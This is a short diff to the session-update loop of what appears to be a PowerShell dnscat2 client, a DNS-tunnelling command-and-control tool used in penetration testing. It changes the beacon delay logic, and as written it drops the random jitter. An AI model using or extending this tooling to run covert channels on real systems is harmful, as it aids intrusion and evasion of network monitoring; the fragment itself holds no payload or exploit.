@@ -911,7 +911,9 @@ function Update-Dnscat2Session ($Session) {
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
         
         # Delay
-        Sleep -Milliseconds ($Session['Delay'] + (Get-Random -Maximum $Session['MaxRandomDelay']))
+        $RandomDelay = $Session['MaxRandomDelay']
+        if ($Session['MaxRandomDelay'] -le 0) { $RandomDelay = 0 }
+        Sleep -Milliseconds ($Session['Delay'] + $RandomDelay)
         
         try {
             $MSGPACKET = (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData)
